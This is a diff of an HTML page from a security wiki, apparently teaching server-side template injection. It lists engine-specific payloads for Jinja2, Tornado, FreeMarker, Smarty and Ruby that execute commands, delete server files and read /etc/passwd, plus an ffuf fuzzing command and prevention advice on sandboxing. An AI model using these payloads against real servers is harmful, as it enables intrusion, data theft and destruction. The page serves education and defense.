 <li>One can use this tool with some fuzzing payloads that can be accessed from ⇒ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz" target="_blank" rel="noreferrer noopener nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/Intruder/ssti.fuzz</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists:FUZZ -u https://target.com/page?name<span style="color:#f92672">=</span>FUZZ -H <span style="color:#e6db74">&#34;Cookie: SESSION-COOKIE-HERE&#34;</span> -mc all 
-</span></span></code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists:FUZZ -u https://target.com/page?name<span style="color:#f92672">=</span>FUZZ -H <span style="color:#e6db74">&#34;Cookie: SESSION-COOKIE-HERE&#34;</span> -mc all </span></span></code></pre></div><ul>
 <li><strong><code>-w</code></strong> is used to specify the wordlists used</li>
 <li><strong><code>-u</code></strong> is used to specify the target URL</li>
 <li><strong><code>-H</code></strong> flag is used to mention the session cookie so one can run an authenticated fuzzing</li>
@@ -1957,69 +1772,47 @@ Template Engine
 </ul>
 </li>
 </ul>
-<h2 id="impact-3">
-  Impact
-  <a class="anchor" href="#impact-3">#</a>
-</h2>
-<h3 id="remote-code-execution">
-  Remote Code Execution
-  <a class="anchor" href="#remote-code-execution">#</a>
-</h3>
+<h2 id="impact-3">Impact<a class="anchor" href="#impact-3">#</a></h2>
+<h3 id="remote-code-execution">Remote Code Execution<a class="anchor" href="#remote-code-execution">#</a></h3>
 <ul>
 <li>
 <p><strong><code>Jinja2  (Python)</code></strong></p>
 <ul>
 <li>
 <p>Server side command execution</p>
-<pre tabindex="0"><code>{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read() }}
-</code></pre></li>
+<pre tabindex="0"><code>{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read() }}</code></pre></li>
 </ul>
 </li>
 <li>
 <p><strong><code>Tornado (Python)</code></strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">os</span><span style="color:#f92672">%</span>}{{<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;id&#39;</span>)}}
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">os</span><span style="color:#f92672">%</span>}{{<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;id&#39;</span>)}}</span></span></code></pre></div></li>
 <li>
 <p><strong><code>FreeMarker (Java)</code></strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#75715e">#assign ex = &#34;freemarker.template.utility.Execute&#34;?new()&gt;${ ex(&#34;id&#34;)} 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#75715e">#assign ex = &#34;freemarker.template.utility.Execute&#34;?new()&gt;${ ex(&#34;id&#34;)} 
 </span></span></span></code></pre></div></li>
 </ul>
-<h3 id="deleting-arbitrary-server-side-files">
-  Deleting Arbitrary Server Side Files
-  <a class="anchor" href="#deleting-arbitrary-server-side-files">#</a>
-</h3>
+<h3 id="deleting-arbitrary-server-side-files">Deleting Arbitrary Server Side Files<a class="anchor" href="#deleting-arbitrary-server-side-files">#</a></h3>
 <ul>
 <li>
 <p><strong><code>EBT (Ruby)</code></strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>File<span style="color:#f92672">.</span>delete(<span style="color:#e6db74">&#39;/path/to/file&#39;</span>)
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>File<span style="color:#f92672">.</span>delete(<span style="color:#e6db74">&#39;/path/to/file&#39;</span>)</span></span></code></pre></div></li>
 <li>
 <p><strong><code>Tornado (Python)</code></strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#f92672">import</span> os<span style="color:#f92672">%</span>}{{os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;path/to/file&#39;</span>)}}
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#f92672">import</span> os<span style="color:#f92672">%</span>}{{os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;path/to/file&#39;</span>)}}</span></span></code></pre></div></li>
 <li>
 <p><strong><code>Smarty (PHP</code></strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#39;/path/to/file&#39;</span>)}
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">unlink</span>(<span style="color:#e6db74">&#39;/path/to/file&#39;</span>)}</span></span></code></pre></div></li>
 </ul>
-<h3 id="lfi">
-  LFI
-  <a class="anchor" href="#lfi">#</a>
-</h3>
+<h3 id="lfi">LFI<a class="anchor" href="#lfi">#</a></h3>
 <ul>
 <li>
 <p><strong><code>Jinja (Python)</code></strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{ <span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">__init__</span>.<span style="color:#a6e22e">__globals__</span>.<span style="color:#a6e22e">__builtins__</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>).<span style="color:#a6e22e">read</span>() }}
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{{ <span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">__init__</span>.<span style="color:#a6e22e">__globals__</span>.<span style="color:#a6e22e">__builtins__</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>).<span style="color:#a6e22e">read</span>() }}</span></span></code></pre></div></li>
 <li>
 <p><strong><code>Tornado (Python)</code></strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">os</span><span style="color:#f92672">%</span>}{{<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#39;path/to/file&#39;</span>).<span style="color:#a6e22e">read</span>()}}
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">os</span><span style="color:#f92672">%</span>}{{<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#39;path/to/file&#39;</span>).<span style="color:#a6e22e">read</span>()}}</span></span></code></pre></div></li>
 </ul>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <ul>
 <li><strong><code>SSTImap</code></strong></li>
 </ul>
@@ -2032,22 +1825,12 @@ Template Engine
 <li><strong><code>ffuf</code></strong></li>
 </ul>
 <p><a href="https://github.com/ffuf/ffuf" target="_blank" rel="noreferrer noopener nofollow">https://github.com/ffuf/ffuf</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<h2 id="prevention-techniques">
-  Prevention Techniques
-  <a class="anchor" href="#prevention-techniques">#</a>
-</h2>
-<h3 id="avoid-rendering-user-input-as-template">
-  Avoid rendering user input as template
-  <a class="anchor" href="#avoid-rendering-user-input-as-template">#</a>
-</h3>
+<h2 id="prevention-techniques">Prevention Techniques<a class="anchor" href="#prevention-techniques">#</a></h2>
+<h3 id="avoid-rendering-user-input-as-template">Avoid rendering user input as template<a class="anchor" href="#avoid-rendering-user-input-as-template">#</a></h3>
 <ul>
 <li>Avoid using code format like shown below</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>render_template_string(user_input) 
-</span></span></code></pre></div><h3 id="using-logic-less-templates">
-  Using Logic-less templates
-  <a class="anchor" href="#using-logic-less-templates">#</a>
-</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>render_template_string(user_input) </span></span></code></pre></div><h3 id="using-logic-less-templates">Using Logic-less templates<a class="anchor" href="#using-logic-less-templates">#</a></h3>
 <ul>
 <li>Mustache</li>
 <li>Handlebars</li>
@@ -2055,42 +1838,30 @@ Template Engine
 <li>Beard</li>
 <li>Stubble</li>
 </ul>
-<h3 id="template-sandboxing">
-  Template Sandboxing
-  <a class="anchor" href="#template-sandboxing">#</a>
-</h3>
+<h3 id="template-sandboxing">Template Sandboxing<a class="anchor" href="#template-sandboxing">#</a></h3>
 <ul>
 <li>
 <p>Restricting Attribute Access</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__class__
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__class__
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>__mro__
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>__subclasses__
-</span></span></code></pre></div></li>
+</span></span><span style="display:flex;"><span>__subclasses__</span></span></code></pre></div></li>
 <li>
 <p>Blocking Function Calls</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ some_function() }}
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ some_function() }}</span></span></code></pre></div></li>
 <li>
 <p>Example of Sandbox environment in Jinja</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2.sandbox <span style="color:#f92672">import</span> SandboxedEnvironment
-</span></span><span style="display:flex;"><span>env <span style="color:#f92672">=</span> SandboxedEnvironment()
-</span></span></code></pre></div></li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2.sandbox <span style="color:#f92672">import</span> SandboxedEnvironment
+</span></span><span style="display:flex;"><span>env <span style="color:#f92672">=</span> SandboxedEnvironment()</span></span></code></pre></div></li>
 </ul>
-<h2 id="good-to-read">
-  Good to Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good to Read<a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><a href="https://hackerone.com/reports/125980" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/125980</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/164224" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/164224</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/423541" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/423541</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/server-side-template-injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://portswigger.net/research/server-side-template-injection" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/research/server-side-template-injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -2109,49 +1880,62 @@ Template Engine
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/930cd58c048c49a6cd3c5045ba784f0e26bd6d68" title='Last modified by Suraj Kumar | August 13, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 13, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Server-Side%20Template%20Injection%20%28SSTI%29.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Server-Side Request Forgery (SSRF)</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Session-Management-Weaknesses/" class="flex align-center">
+        <span>Session Management Weaknesses</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2245,15 +2029,24 @@ Template Engine
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
